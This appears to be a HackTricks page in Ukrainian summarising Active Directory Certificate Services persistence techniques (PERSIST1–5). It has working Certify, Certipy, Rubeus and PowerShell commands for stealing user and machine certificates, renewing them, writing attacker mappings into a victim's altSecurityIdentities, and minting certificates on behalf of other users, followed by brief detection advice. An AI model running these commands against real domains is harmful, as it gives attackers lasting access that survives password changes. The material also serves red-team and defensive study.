# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Це невеликий підсумок глав про збереження облікових записів з чудового дослідження з [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Розуміння крадіжки облікових даних активного користувача за допомогою сертифікатів – PERSIST1

У сценарії, де сертифікат, що дозволяє автентифікацію домену, може бути запитаний користувачем, зловмисник має можливість запитати та вкрасти цей сертифікат для підтримки постійності в мережі. За замовчуванням шаблон `User` в Active Directory дозволяє такі запити, хоча іноді він може бути вимкнений.

Використовуючи [Certify](https://github.com/GhostPack/Certify) або [Certipy](https://github.com/ly4k/Certipy), ви можете шукати активовані шаблони, які дозволяють автентифікацію клієнтів, а потім запитати один:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Сила сертифіката полягає в його здатності аутентифікуватися як користувач, якому він належить, незалежно від змін пароля, поки сертифікат залишається дійсним.

Ви можете конвертувати PEM в PFX і використовувати його для отримання TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Примітка: У поєднанні з іншими техніками (див. розділи THEFT), автентифікація на основі сертифікатів дозволяє отримати постійний доступ без втручання в LSASS і навіть з не підвищених контекстів.

## Отримання постійності машини за допомогою сертифікатів - PERSIST2

Якщо зловмисник має підвищені привілеї на хості, він може зареєструвати обліковий запис машини скомпрометованої системи для сертифіката, використовуючи шаблон за замовчуванням `Machine`. Автентифікація як машина дозволяє S4U2Self для локальних служб і може забезпечити надійну постійність хоста:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Розширення стійкості через поновлення сертифікатів - PERSIST3

Зловживання термінами дії та поновлення шаблонів сертифікатів дозволяє зловмиснику підтримувати довгостроковий доступ. Якщо у вас є раніше виданий сертифікат і його приватний ключ, ви можете поновити його до закінчення терміну дії, щоб отримати новий, довгостроковий обліковий запис, не залишаючи додаткових артефактів запиту, пов'язаних з оригінальним принципалом.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Оперативна порада: Відстежуйте терміни дії PFX файлів, що знаходяться у володінні зловмисника, і оновлюйте їх заздалегідь. Оновлення також може призвести до того, що нові сертифікати включатимуть сучасне розширення SID mapping, що дозволяє їх використовувати відповідно до більш суворих правил мапування DC (див. наступний розділ).

## Явне визначення мапувань сертифікатів (altSecurityIdentities) – PERSIST4

Якщо ви можете записувати в атрибут `altSecurityIdentities` цільового облікового запису, ви можете явно зв'язати сертифікат, контрольований зловмисником, з цим обліковим записом. Це зберігається при зміні паролів і, при використанні сильних форматів мапування, залишається функціональним під час сучасного виконання DC.

Високорівневий процес:

1. Отримайте або випустіть сертифікат клієнтської автентифікації, яким ви керуєте (наприклад, зареєструйте шаблон `User` на себе).
2. Витягніть сильний ідентифікатор з сертифіката (Issuer+Serial, SKI або SHA1-PublicKey).
3. Додайте явне мапування до `altSecurityIdentities` жертви, використовуючи цей ідентифікатор.
4. Аутентифікуйтеся за допомогою вашого сертифіката; DC зв'язує його з жертвою через явне мапування.

Приклад (PowerShell) з використанням сильного мапування Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Потім автентифікуйтеся за допомогою вашого PFX. Certipy отримає TGT безпосередньо:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
```
Notes
- Використовуйте тільки сильні типи відображення: X509IssuerSerialNumber, X509SKI або X509SHA1PublicKey. Слабкі формати (Subject/Issuer, Subject-only, RFC822 email) застаріли і можуть бути заблоковані політикою DC.
- Ланцюг сертифікатів повинен будуватися до кореневого, який довіряє DC. Корпоративні ЦС в NTAuth зазвичай є довіреними; деякі середовища також довіряють публічним ЦС.

For more on weak explicit mappings and attack paths, see:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Відкликання сертифіката агента або дозволів шаблону необхідне для видалення цієї стійкості.

## 2025 Сильне застосування мапування сертифікатів: Вплив на стійкість

Microsoft KB5014754 впровадив сильне застосування мапування сертифікатів на контролерах домену. З 11 лютого 2025 року контролери домену за замовчуванням переходять на повне застосування, відхиляючи слабкі/неоднозначні мапування. Практичні наслідки:

- Сертифікати до 2022 року, які не мають розширення мапування SID, можуть не пройти неявне мапування, коли контролери домену перебувають у повному застосуванні. Зловмисники можуть підтримувати доступ, або оновлюючи сертифікати через AD CS (щоб отримати розширення SID), або шляхом впровадження сильного явного мапування в `altSecurityIdentities` (PERSIST4).
- Явні мапування, що використовують сильні формати (Issuer+Serial, SKI, SHA1-PublicKey), продовжують працювати. Слабкі формати (Issuer/Subject, Subject-only, RFC822) можуть бути заблоковані і їх слід уникати для стійкості.

Адміністратори повинні моніторити та сповіщати про:
- Зміни в `altSecurityIdentities` та видачу/оновлення сертифікатів агента реєстрації та користувача.
- Журнали видачі ЦС для запитів від імені та незвичних патернів оновлення.

## Посилання

- Microsoft. KB5014754: Зміни в аутентифікації на основі сертифікатів на контролерах домену Windows (графік застосування та сильні мапування).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy Wiki – Довідник команд (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference

{{#include ../../../banners/hacktricks-training.md}}
